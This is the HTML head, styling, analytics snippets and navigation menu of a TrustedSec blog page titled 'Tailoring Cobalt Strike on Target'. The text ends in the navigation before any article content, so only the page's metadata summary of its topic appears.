
	
			

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
	<head>
		<!-- Charset, Compatibility, Preconnect,and Preload -->
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta name="format-detection" content="telephone=no">
		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
		<link rel="preconnect" href="https://fonts.cdnfonts.com">
		<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&amp;display=swap">
		<link rel="preload" as="style" href="https://fonts.cdnfonts.com/css/switzer">		
		<link rel="preload" as="style" href="/fonts/stylesheet.css">		
		<link rel="preload" as="style" href="/dist/style.min.css?ver=dd6afd28096abab5e16c2df1325360883ca900bd">		

		<!-- Favicons -->
		<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
		<link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
		<link rel="manifest" href="/favicons/site.webmanifest">
		<link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#0d412e">
		<meta name="msapplication-TileColor" content="#0d412e">
		<meta name="theme-color" content="#0d412e">

		<!-- Fonts/CSS -->
		<link rel="stylesheet" media="print" onload="this.onload=null;this.removeAttribute('media');" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&amp;display=swap">
		<noscript>
			<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&amp;display=swap">
		</noscript>		

		<link href="https://fonts.cdnfonts.com/css/switzer" rel="stylesheet">
		<link href="/fonts/stylesheet.css" rel="stylesheet">
		<link href="/dist/style.min.css?v=dd6afd28096abab5e16c2df1325360883ca900bd" rel="stylesheet">
		
		    <style>
        .slick-slider{
            position:relative;
            display:block;
            box-sizing:border-box;
            -webkit-touch-callout:none;
            -webkit-user-select:none;
            -khtml-user-select:none;
            -moz-user-select:none;
            -ms-user-select:none;
            user-select:none;
            -ms-touch-action:pan-y;
            touch-action:pan-y;
            -webkit-tap-highlight-color:transparent
        }
        .slick-list{
            position:relative;
            overflow:hidden;
            display:block;
            margin:0;
            padding:0
        }
        .slick-list:focus{
            outline:0
        }
        .slick-list.dragging{
            cursor:pointer;cursor:hand
        }
        .slick-slider .slick-list,.slick-slider .slick-track{
            -webkit-transform:translate3d(0,0,0);
            -moz-transform:translate3d(0,0,0);
            -ms-transform:translate3d(0,0,0);
            -o-transform:translate3d(0,0,0);
            transform:translate3d(0,0,0)
        }
        .slick-track{position:relative;left:0;top:0;display:block;margin-left:auto;margin-right:auto}
        .slick-track:after,.slick-track:before{content:"";display:table}.slick-track:after{clear:both}
        .slick-loading .slick-track{visibility:hidden}.slick-slide{float:left;height:100%;min-height:1px;display:none}
        [dir=rtl] .slick-slide{
            float:right
        }
        .slick-slide img{
            display:block
        }
        .slick-slide.slick-loading img{
            display:none
        }
        .slick-slide.dragging img{
            pointer-events:none
        }
        .slick-initialized .slick-slide{
            display:block
        }
        .slick-loading .slick-slide{
            visibility:hidden
        }
        .slick-vertical .slick-slide{
            display:block;height:auto;border:1px solid transparent
        }
        .slick-arrow.slick-hidden{
            display:none
        }
    </style>
    <style type="text/css">
        .crjs .phoneswap {
            visibility: hidden;
        }</style>
    <style>
        .Typewriter__cursor{
            -webkit-animation:Typewriter-cursor 1s infinite;
            animation:Typewriter-cursor 1s infinite;margin-left:1px
        }
        @-webkit-keyframes Typewriter-cursor{
            0%{opacity:0
            }
            50%{
                opacity:1
            }
            100%{
                opacity:0
            }
        }
        @keyframes Typewriter-cursor{
            0%{
                opacity:0
            }
            50%{
                opacity:1
            }
            100%{
                opacity:0
            }
        }
    </style>
	<title>TrustedSec | Tailoring Cobalt Strike on Target</title>
<script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments)};
gtag('js', new Date());
gtag('config', 'G-ZZRH5HP7B0', {'send_page_view': true,'anonymize_ip': false,'link_attribution': false,'allow_display_features': false});
</script>
<script>dataLayer = [];
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-WNTJBFX');
</script><meta name="generator" content="SEOmatic">
<meta name="keywords" content="Patching Cobalt Strike&#039;s beacon payload on target to ensure successful C2 execution, including customizing user-agent and C2 server options for optimized phishing campaigns.">
<meta name="description" content="Patching Cobalt Strike&#039;s beacon payload on target to ensure successful C2 execution, including customizing user-agent and C2 server options for optimized…">
<meta name="referrer" content="no-referrer-when-downgrade">
<meta name="robots" content="all">
<meta content="en_US" property="og:locale">
<meta content="TrustedSec" property="og:site_name">
<meta content="website" property="og:type">
<meta content="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target" property="og:url">
<meta content="Tailoring Cobalt Strike on Target" property="og:title">
<meta content="Patching Cobalt Strike&#039;s beacon payload on target to ensure successful C2 execution, including customizing user-agent and C2 server options for optimized…" property="og:description">
<meta content="https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=1200&amp;h=630&amp;q=82&amp;auto=format&amp;fit=crop&amp;dm=1695232909&amp;s=4bf1fdbc127bd281b18c4bf23b65d994" property="og:image">
<meta content="1200" property="og:image:width">
<meta content="630" property="og:image:height">
<meta content="Patching Cobalt Strike&#039;s beacon payload on target to ensure successful C2 execution, including customizing user-agent and C2 server options for optimized phishing campaigns." property="og:image:alt">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:creator" content="@">
<meta name="twitter:title" content="Tailoring Cobalt Strike on Target">
<meta name="twitter:description" content="Patching Cobalt Strike&#039;s beacon payload on target to ensure successful C2 execution, including customizing user-agent and C2 server options for optimized…">
<meta name="twitter:image" content="https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=800&amp;h=418&amp;q=82&amp;auto=format&amp;fit=crop&amp;dm=1695232909&amp;s=45ab7ea3ac6479b4015c9017574edcea">
<meta name="twitter:image:width" content="800">
<meta name="twitter:image:height" content="418">
<meta name="twitter:image:alt" content="Patching Cobalt Strike&#039;s beacon payload on target to ensure successful C2 execution, including customizing user-agent and C2 server options for optimized phishing campaigns.">
<link href="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target" rel="canonical">
<link href="https://trustedsec.com/" rel="home">
<link type="text/plain" href="https://trustedsec.com/humans.txt" rel="author">
<link type="application/rss+xml" href="https://trustedsec.com/feed.rss" rel="alternate">
<link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/sunburst.min.css" rel="stylesheet"></head>
  <body class="mx-auto lang-en section-blog type-blog antialiased overscroll-none"><script async src="https://www.googletagmanager.com/gtag/js?id=G-ZZRH5HP7B0"></script>

<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WNTJBFX"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
	

    

<!-- Global Header -->
<header class="c-header top-0 inset-x-0 z-100 sticky" x-data="header({toast: true, toastKey: &#039;_trimarcbanner&#039;, sticky: true, stickyReverseHide: false, fixed: ''})" x-trap="menuOpen" @resize.window="onResize()" @scroll.document="onScroll()" :class="menuBarClass()" x-cloak>

	<a class="c-skip fixed z-100 top-0 left-1/2 bg-code text-white rounded-b-card text-sm uppercase tracking-widest px-p16 py-p8 transfrom -translate-x-1/2 -translate-y-full focus:translate-y-none transition-transform duration-300 ease-in-out" href="#main" x-ref="skip" x-show="!menuOpen" @click="onSkip()"><span>Skip to Main Content</span></a>

	<div x-ref="header-wrap" @click.outside="closeMenu()">
                                            <div class="c-toast" x-cloak x-show="showToast()" x-collapse.700ms>
      <div class="relative flex flex-wrap justify-center items-center gap-x-p12 py-p8 px-p48 text-center bg-error text-white">
        <span>All Trimarc services are now delivered through TrustedSec!</span>
                            <a href="https://trustedsec.com/about-us/news/trimarc-joins-forces-with-trustedsec-to-strengthen-security-advisory-services" class="c-button v-url-alt relative z-10 overflow-hidden overflow-ellipsis w-auto inline-block group p-p4 underline rounded-p8 group-hover:text-black group-focus:text-black hover:text-black focus:text-black focus:outline-none transition-colors duration-500 before:absolute before:-z-1 before:inset-y-0 before:left-0 before:right-full before:bg-cereal before:transition-all before:duration-500 before:duration-500 before:rounded-p4 hover:before:right-0 hover:before:bg-cereal focus:before:right-0 focus:before:bg-cereal disabled:hover:before:bg-transparent group-hover:before:right-0 group-hover:before:bg-cereal group-focus:before:right-0 group-focus:before:bg-cereal">Learn more</a>                <button class="absolute top-p12 right-p16" @click="hideToast()">
          <svg role="presentation" class="c-icon h-p12 w-p12 group-hover:fill-white"><use xlink:href="/ui/icons.svg?1.26#icon-close" /></svg>
          <span class="sr-only">Close</span>      
        </button>
      </div>
    </div>
    		<div class="relative z-50 py-p24 px-p32 text-white bg-black" x-ref="header-bar" >

      <div class="flex relative z-0">
        <div class="relative z-10">
          <a class="c-logo" href="https://trustedsec.com/">
            <svg
width="238" height="33" viewBox="0 0 238 33" fill="none" xmlns="http://www.w3.org/2000/svg" class="fill-white w-logo-sm mq1024:w-logo-lg">
<description>TrustedSec</description>
<path
d="M22.8448 0.673828H3.33368C3.09614 0.673828 2.93365 0.792573 2.84478 1.02944L0.0448049 7.11829C-0.014935 7.26689 -0.014935 7.3926 0.0448049 7.49608C0.103824 7.60026 0.222525 7.65161 0.400332 7.65161H8.35591V31.3405C8.35591 31.6371 8.50381 31.785 8.80037 31.785H15.6004C15.8962 31.785 16.0448 31.6371 16.0448 31.3405V7.65161H22.8448C23.1407 7.65161 23.2893 7.50372 23.2893 7.20724V1.11827C23.2893 0.822428 23.1407 0.673828 22.8448 0.673828Z" />
<path
d="M42.9495 19.5628C44.6676 18.7628 46.0009 17.5926 46.9496 16.0516C47.8975 14.5113 48.3718 12.778 48.3718 10.8516C48.3718 8.9558 47.9273 7.2294 47.0384 5.67388C46.1496 4.11833 44.8752 2.89607 43.2162 2.00721C41.5565 1.11827 39.6453 0.673828 37.4829 0.673828H26.1495C25.8529 0.673828 25.7051 0.822428 25.7051 1.11827V31.3405C25.7051 31.6371 25.853 31.785 26.1495 31.785H32.9051C33.2009 31.785 33.3495 31.6371 33.3495 31.3405V20.7183H35.305L41.2606 31.4739C41.3787 31.6815 41.5565 31.785 41.794 31.785H49.7051C49.9718 31.785 50.1051 31.6961 50.1051 31.5183C50.1051 31.4593 50.0752 31.3704 50.0162 31.2517L42.9495 19.5628ZM39.7718 13.1406C39.1641 13.6891 38.2384 13.9628 36.994 13.9628H33.3495V7.6516H36.994C38.2384 7.6516 39.1641 7.93359 39.7718 8.49611C40.3787 9.05928 40.6829 9.84473 40.6829 10.8516C40.6829 11.8294 40.3787 12.5926 39.7718 13.1406Z" />
<path
d="M74.7433 0.673828H67.9433C67.6468 0.673828 67.4989 0.822428 67.4989 1.11827V19.1627C67.4989 20.8516 67.0766 22.2003 66.2322 23.2073C65.3877 24.2149 64.2246 24.7183 62.7433 24.7183C61.262 24.7183 60.0912 24.2149 59.2322 23.2073C58.3725 22.2003 57.9433 20.8516 57.9433 19.1627V1.11827C57.9433 0.822428 57.7947 0.673828 57.4989 0.673828H50.7433C50.4468 0.673828 50.2988 0.822428 50.2988 1.11827V19.4739C50.2988 21.9336 50.7947 24.126 51.7878 26.0517C52.7801 27.978 54.21 29.4891 56.0767 30.585C57.9433 31.6815 60.1655 32.2294 62.7433 32.2294C65.3211 32.2294 67.5433 31.6815 69.41 30.585C71.2766 29.4891 72.7058 27.978 73.6989 26.0517C74.6912 24.126 75.1878 21.9336 75.1878 19.4739V1.11827C75.1878 0.822428 75.0392 0.673828 74.7433 0.673828Z" />
<path
d="M92.7366 14.4749C91.5957 13.8971 90.1366 13.3123 88.3588 12.7194C87.0255 12.2749 86.04 11.8603 85.4033 11.4749C84.7658 11.0901 84.4477 10.5714 84.4477 9.9193C84.4477 9.2679 84.7213 8.74152 85.2699 8.34157C85.8178 7.94154 86.5658 7.74156 87.5144 7.74156C88.6102 7.74156 89.6102 7.89712 90.5143 8.20822C91.4179 8.51932 92.1811 8.92702 92.8033 9.43048C93.0991 9.60819 93.3068 9.5492 93.4255 9.25267L96.1366 3.11929C96.2845 2.88246 96.2401 2.69015 96.0033 2.54152C95.2623 1.94919 94.188 1.41588 92.781 0.941552C91.3734 0.467929 89.7658 0.230469 87.9588 0.230469C85.588 0.230469 83.5588 0.674842 81.8699 1.56377C80.1811 2.45271 78.9067 3.64569 78.0477 5.14155C77.1879 6.63809 76.7588 8.29012 76.7588 10.0971C76.7588 12.0527 77.181 13.6304 78.0254 14.8305C78.8699 16.0304 79.8401 16.9124 80.9366 17.4749C82.0325 18.0381 83.4845 18.6159 85.2921 19.2083C86.7144 19.6826 87.7588 20.127 88.4255 20.5416C89.0922 20.9568 89.4255 21.5194 89.4255 22.2305C89.4255 22.9715 89.1366 23.5715 88.5588 24.0304C87.981 24.4902 87.0845 24.7194 85.8699 24.7194C83.6477 24.7194 81.5144 23.9194 79.4699 22.3194C79.1734 22.1415 78.9657 22.2013 78.8477 22.4971L76.1366 28.6305C75.988 28.868 76.0325 29.0749 76.2699 29.2527C77.2477 30.0235 78.5366 30.7124 80.1366 31.3194C81.7366 31.9263 83.6178 32.2305 85.781 32.2305C88.1213 32.2305 90.1366 31.8006 91.8255 30.9416C93.5144 30.0825 94.8033 28.8971 95.6922 27.386C96.581 25.8749 97.0255 24.1569 97.0255 22.2305C97.0255 20.127 96.5956 18.4527 95.7366 17.2083C94.8769 15.9638 93.8768 15.0527 92.7366 14.4749Z" />
<path
d="M119.165 0.673828H99.654C99.4165 0.673828 99.254 0.792573 99.1651 1.02944L96.3651 7.11829C96.3054 7.26689 96.3054 7.3926 96.3651 7.49608C96.4242 7.60026 96.5429 7.65161 96.7207 7.65161H104.676V31.3405C104.676 31.6371 104.824 31.785 105.121 31.785H111.921C112.217 31.785 112.365 31.6371 112.365 31.3405V7.65161H119.165C119.461 7.65161 119.61 7.50372 119.61 7.20724V1.11827C119.61 0.822428 119.461 0.673828 119.165 0.673828Z" />
<path
d="M141.344 24.8072H129.521V19.6072H139.299C139.595 19.6072 139.744 19.4593 139.744 19.1627V13.0739C139.744 12.778 139.595 12.6294 139.299 12.6294H129.521V7.65161H140.766C141.062 7.65161 141.21 7.50372 141.21 7.20724V1.11827C141.21 0.822428 141.062 0.673828 140.766 0.673828H122.321C122.025 0.673828 121.877 0.822428 121.877 1.11827V31.3405C121.877 31.6371 122.025 31.785 122.321 31.785H141.344C141.639 31.785 141.788 31.6371 141.788 31.3405V25.2517C141.788 24.9558 141.639 24.8072 141.344 24.8072Z" />
<path
d="M168.054 8.36272C166.779 5.99261 164.994 4.11831 162.698 2.74049C160.402 1.36277 157.802 0.673828 154.898 0.673828H144.409C144.113 0.673828 143.965 0.822428 143.965 1.11827V31.3405C143.965 31.6371 144.113 31.785 144.409 31.785H154.898C157.832 31.785 160.438 31.0961 162.72 29.7183C165.002 28.3406 166.779 26.4669 168.054 24.0961C169.327 21.726 169.965 19.1037 169.965 16.2294C169.965 13.3552 169.327 10.7336 168.054 8.36272ZM161.431 20.2961C160.838 21.6148 159.979 22.6961 158.854 23.5406C157.727 24.385 156.424 24.8072 154.943 24.8072H151.609V7.6516H154.943C156.424 7.6516 157.727 8.07387 158.854 8.91832C159.979 9.76272 160.838 10.8447 161.431 12.1628C162.024 13.4815 162.32 14.837 162.32 16.2294C162.32 17.6218 162.024 18.9781 161.431 20.2961Z" />
<path
d="M186.612 14.4749C185.471 13.8971 184.012 13.3123 182.234 12.7194C180.9 12.2749 179.915 11.8603 179.278 11.4749C178.641 11.0901 178.323 10.5714 178.323 9.9193C178.323 9.2679 178.596 8.74152 179.145 8.34157C179.693 7.94154 180.441 7.74156 181.389 7.74156C182.485 7.74156 183.485 7.89712 184.389 8.20822C185.293 8.51932 186.056 8.92702 186.678 9.43048C186.974 9.60819 187.182 9.5492 187.301 9.25267L190.012 3.11929C190.159 2.88246 190.115 2.69015 189.878 2.54152C189.137 1.94919 188.063 1.41588 186.656 0.941552C185.248 0.467929 183.641 0.230469 181.834 0.230469C179.463 0.230469 177.434 0.674842 175.745 1.56377C174.056 2.45271 172.782 3.64569 171.923 5.14155C171.063 6.63809 170.634 8.29012 170.634 10.0971C170.634 12.0527 171.056 13.6304 171.901 14.8305C172.745 16.0304 173.715 16.9124 174.812 17.4749C175.907 18.0381 177.36 18.6159 179.167 19.2083C180.589 19.6826 181.634 20.127 182.3 20.5416C182.967 20.9568 183.301 21.5194 183.301 22.2305C183.301 22.9715 183.012 23.5715 182.434 24.0304C181.856 24.4902 180.959 24.7194 179.745 24.7194C177.523 24.7194 175.389 23.9194 173.345 22.3194C173.048 22.1415 172.841 22.2013 172.723 22.4971L170.012 28.6305C169.863 28.868 169.907 29.0749 170.145 29.2527C171.123 30.0235 172.412 30.7124 174.012 31.3194C175.612 31.9263 177.493 32.2305 179.656 32.2305C181.996 32.2305 184.012 31.8006 185.701 30.9416C187.389 30.0825 188.678 28.8971 189.567 27.386C190.456 25.8749 190.9 24.1569 190.9 22.2305C190.9 20.127 190.471 18.4527 189.612 17.2083C188.752 15.9638 187.752 15.0527 186.612 14.4749Z" />
<path
d="M212.326 24.8072H200.504V19.6072H210.282C210.577 19.6072 210.726 19.4593 210.726 19.1627V13.0739C210.726 12.778 210.577 12.6294 210.282 12.6294H200.504V7.65161H211.748C212.044 7.65161 212.193 7.50372 212.193 7.20724V1.11827C212.193 0.822428 212.044 0.673828 211.748 0.673828H193.304C193.007 0.673828 192.859 0.822428 192.859 1.11827V31.3405C192.859 31.6371 193.007 31.785 193.304 31.785H212.326C212.622 31.785 212.771 31.6371 212.771 31.3405V25.2517C212.771 24.9558 212.622 24.8072 212.326 24.8072Z" />
<path
d="M237.267 29.2083L234.511 23.2083C234.422 23.0305 234.303 22.9416 234.156 22.9416C234.096 22.9416 234.007 22.9715 233.889 23.0305C232.14 24.1569 230.259 24.7194 228.244 24.7194C226.555 24.7194 225.14 24.3048 224 23.4749C222.859 22.6458 222.015 21.5861 221.467 20.2972C220.918 19.0082 220.644 17.6526 220.644 16.2305C220.644 14.8083 220.918 13.4527 221.467 12.1638C222.015 10.8749 222.867 9.81586 224.022 8.98602C225.178 8.15685 226.615 7.74159 228.333 7.74159C230.111 7.74159 231.815 8.26033 233.444 9.29714C233.563 9.38597 233.674 9.41589 233.778 9.38597C233.881 9.35687 233.962 9.26794 234.022 9.11934L236.778 2.98603C236.896 2.71935 236.837 2.51238 236.6 2.36373C234.2 0.941566 231.444 0.230469 228.333 0.230469C225.281 0.230469 222.592 0.949163 220.267 2.386C217.94 3.82348 216.148 5.76373 214.889 8.20822C213.629 10.6527 213 13.3269 213 16.2305C213 19.134 213.629 21.8083 214.889 24.2526C216.148 26.6971 217.918 28.6381 220.2 30.0749C222.481 31.5124 225.118 32.2305 228.111 32.2305C231.696 32.2305 234.703 31.4159 237.133 29.786C237.281 29.6971 237.355 29.5936 237.355 29.4749C237.355 29.4159 237.326 29.327 237.267 29.2083Z" />
</svg>          </a>
        </div>
        <div class="flex justify-end items-center absolute left-0 right-0 top-center z-0 ml-logo pl-p64">

                    <template x-if="!menuMobile">
            <nav class="relative flex pl-p80" aria-label="Primary Navigation" x-links>
              
              <ul class="flex justify-end items-center">
                                  <li class="text-lg ml-p32 group/top" @mouseover="setSubNav('subnav-3183')" @mouseleave="setSubNav(false)">

                                      <a class="c-primary-nav-item block overflow-hidden relative z-1 rounded-lg pt-p4 pb-p6 px-p8 transition-colors duration-500 group-hover/top:text-black hover:text-black focus:text-black before:absolute before:inset-y-0 before:left-0 before:right-full before:duration-500 before:transition-all before:bg-gibson before:-z-1 group-hover/top:before:right-0 group-hover/top:before:bg-gibson hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson" href="https://trustedsec.com/solutions">Solutions</a>
                                                        <div class="absolute left-0 z-10 top-full w-full" :class="showSubNav('subnav-3183')" x-ref="subnav-3183">
                      <div class="pt-p28">
                        <div class="bg-code-dark p-p24 w-full flex" data-dropdown>
                          <div class="w-1/2 shrink-0 grow-0 pr-p16 flex flex-col">
                            <div class="mb-p24 last:mb-none">
                              <h2 class="text-h3 mb-p24">Solutions</h2>
                                                              <p>Our custom solutions are tailored to address the unique challenges of different roles in security.</p>
                                                          </div>
                            <div class="mt-auto">
                              <a href="https://trustedsec.com/solutions" class="c-button v-white group appearance-none inline-block relative z-1 overflow-hidden p-p24 bg-transparent text-white border border-white hover:border-gibson focus:border-gibson rounded-p16 text-center text-lg mq1024:text-h3 disabled:opacity-40 disabled:cursor-not-allowed hover:text-black focus:text-black hover:bg-gibson focus:bg-gibson disabled:hover:bg-transparent disabled:hover:text-black hover:border-gibson focus:border-gibson transition-button duration-500 ease-in-out whitespace-nowrap before:absolute before:-z-1 before:inset-y-0 before:left-0 before:right-full before:bg-gibson before:transition-all before:duration-500 hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson disabled:hover:before:bg-transparent"><svg role="presentation" class="c-icon v-button-white w-p28 h-p28 stroke-none fill-gibson transition-colors group-hover:fill-black group-focus:fill-black mr-p8 -ml-p2"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>Solutions</a>                            </div>
                          </div>
                          <ul class="flex-1">
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/solutions/for-leadership">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">01</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">For Leadership</div>
                                                                      <div class="text-sm">We understand the challenges facing modern executives and develop solutions unique to leaders.</div>
                                                                  </a>
                              </li>
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/solutions/for-operations">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">02</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">For Operations</div>
                                                                      <div class="text-sm">We stay one step ahead to proactively safeguard our clients and partners.</div>
                                                                  </a>
                              </li>
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/solutions/for-infrastructure">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">03</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">For Infrastructure</div>
                                                                      <div class="text-sm">From architecture to resiliency and maintainability, we keep your tech aligned to best practices.</div>
                                                                  </a>
                              </li>
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/solutions/for-assurance">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">04</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">For Assurance</div>
                                                                      <div class="text-sm">Our compliance experts guide partners through regulatory requirements to ensure standards are met.</div>
                                                                  </a>
                              </li>
                                                      </ul>
                        </div>
                      </div>
                    </div>
                                    </li>
                                  <li class="text-lg ml-p32 group/top" @mouseover="setSubNav('subnav-3184')" @mouseleave="setSubNav(false)">

                                      <a class="c-primary-nav-item block overflow-hidden relative z-1 rounded-lg pt-p4 pb-p6 px-p8 transition-colors duration-500 group-hover/top:text-black hover:text-black focus:text-black before:absolute before:inset-y-0 before:left-0 before:right-full before:duration-500 before:transition-all before:bg-gibson before:-z-1 group-hover/top:before:right-0 group-hover/top:before:bg-gibson hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson" href="https://trustedsec.com/services">Services</a>
                                                        <div class="absolute left-0 z-10 top-full w-full" :class="showSubNav('subnav-3184')" x-ref="subnav-3184">
                      <div class="pt-p28">
                        <div class="bg-code-dark p-p24 w-full flex" data-dropdown>
                          <div class="w-1/2 shrink-0 grow-0 pr-p16 flex flex-col">
                            <div class="mb-p24 last:mb-none">
                              <h2 class="text-h3 mb-p24">Services</h2>
                                                              <p>From building to testing to hardening, our services support security at every stage.</p>
                                                          </div>
                            <div class="mt-auto">
                              <a href="https://trustedsec.com/services" class="c-button v-white group appearance-none inline-block relative z-1 overflow-hidden p-p24 bg-transparent text-white border border-white hover:border-gibson focus:border-gibson rounded-p16 text-center text-lg mq1024:text-h3 disabled:opacity-40 disabled:cursor-not-allowed hover:text-black focus:text-black hover:bg-gibson focus:bg-gibson disabled:hover:bg-transparent disabled:hover:text-black hover:border-gibson focus:border-gibson transition-button duration-500 ease-in-out whitespace-nowrap before:absolute before:-z-1 before:inset-y-0 before:left-0 before:right-full before:bg-gibson before:transition-all before:duration-500 hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson disabled:hover:before:bg-transparent"><svg role="presentation" class="c-icon v-button-white w-p28 h-p28 stroke-none fill-gibson transition-colors group-hover:fill-black group-focus:fill-black mr-p8 -ml-p2"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>Services</a>                            </div>
                          </div>
                          <ul class="flex-1">
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/services/design">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">01</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">Design</div>
                                                                      <div class="text-sm">Design an exceptional, custom security program alongside our security experts.</div>
                                                                  </a>
                              </li>
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/services/evaluate">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">02</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">Evaluate</div>
                                                                      <div class="text-sm">Evaluate your security program with proven assessment methodologies.</div>
                                                                  </a>
                              </li>
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/services/harden">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">03</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">Harden</div>
                                                                      <div class="text-sm">Harden your security program with the help of our security experts.</div>
                                                                  </a>
                              </li>
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/services/respond">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">04</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">Respond</div>
                                                                      <div class="text-sm">Respond to threats to your security program with the help of our security experts.</div>
                                                                  </a>
                              </li>
                                                      </ul>
                        </div>
                      </div>
                    </div>
                                    </li>
                                  <li class="text-lg ml-p32 group/top" @mouseover="setSubNav('subnav-3247')" @mouseleave="setSubNav(false)">

                                      <a class="c-primary-nav-item block overflow-hidden relative z-1 rounded-lg pt-p4 pb-p6 px-p8 transition-colors duration-500 group-hover/top:text-black hover:text-black focus:text-black before:absolute before:inset-y-0 before:left-0 before:right-full before:duration-500 before:transition-all before:bg-gibson before:-z-1 group-hover/top:before:right-0 group-hover/top:before:bg-gibson hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson" href="https://trustedsec.com/research">Research</a>
                                                      </li>
